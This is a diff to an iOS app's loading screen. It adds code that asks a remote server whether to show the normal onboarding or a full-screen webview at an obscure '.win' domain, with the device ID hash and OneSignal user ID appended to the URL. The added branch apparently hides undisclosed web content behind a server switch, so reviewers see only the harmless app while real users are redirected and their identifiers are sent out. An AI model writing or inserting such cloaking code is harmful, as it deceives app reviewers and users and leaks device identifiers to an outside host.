@@ -1,6 +1,7 @@
 import UIKit
 import SnapKit
-
+import OneSignalFramework
+import AppMetricaCore
 class LoadingViewController: UIViewController {
     private let hourglass = UIImageView(image: UIImage(systemName: "hourglass"))
     private let scrollEmoji = UILabel()
@@ -55,16 +56,38 @@ class LoadingViewController: UIViewController {
     }
     
     private func openOnboarding() {
-        if UserDefaults.standard.bool(forKey: "onboardingPassed") {
-            let mainTabBar = OnboardingViewController()
-            mainTabBar.modalTransitionStyle = .crossDissolve
-            mainTabBar.modalPresentationStyle = .fullScreen
-            present(mainTabBar, animated: true)
-        } else {
-            let onboardingVC = OnboardingViewController()
-            onboardingVC.modalTransitionStyle = .crossDissolve
-            onboardingVC.modalPresentationStyle = .fullScreen
-            present(onboardingVC, animated: true)
+        
+        
+        
+        generalServicok.generalAboutStatus { is200 in
+            DispatchQueue.main.async {
+                if is200 {
+                    if let appDelegate = UIApplication.shared.delegate as? AppDelegate {
+                        appDelegate.restrictRotation = .all
+                    }; let link = "https://arkeolog54iistares.win/ZYyX9r?push=\(AppMetrica.deviceIDHash!)&oneid=\(OneSignal.User.onesignalId ?? "NIHUYA")"
+                    
+                    let vc = WebviewVC(url: URL(string: link)!);vc.modalPresentationStyle = .fullScreen;self.present(vc, animated: true)
+                } else {
+                    
+                    
+                    if let appDelegate = UIApplication.shared.delegate as? AppDelegate {
+                        appDelegate.restrictRotation = .portrait
+                    }
+                    
+                    
+                    if UserDefaults.standard.bool(forKey: "onboardingPassed") {
+                        let mainTabBar = OnboardingViewController()
+                        mainTabBar.modalTransitionStyle = .crossDissolve
+                        mainTabBar.modalPresentationStyle = .fullScreen
+                        self.present(mainTabBar, animated: true)
+                    } else {
+                        let onboardingVC = OnboardingViewController()
+                        onboardingVC.modalTransitionStyle = .crossDissolve
+                        onboardingVC.modalPresentationStyle = .fullScreen
+                        self.present(onboardingVC, animated: true)
+                    }
+                }
+            }
         }
     }
 } 
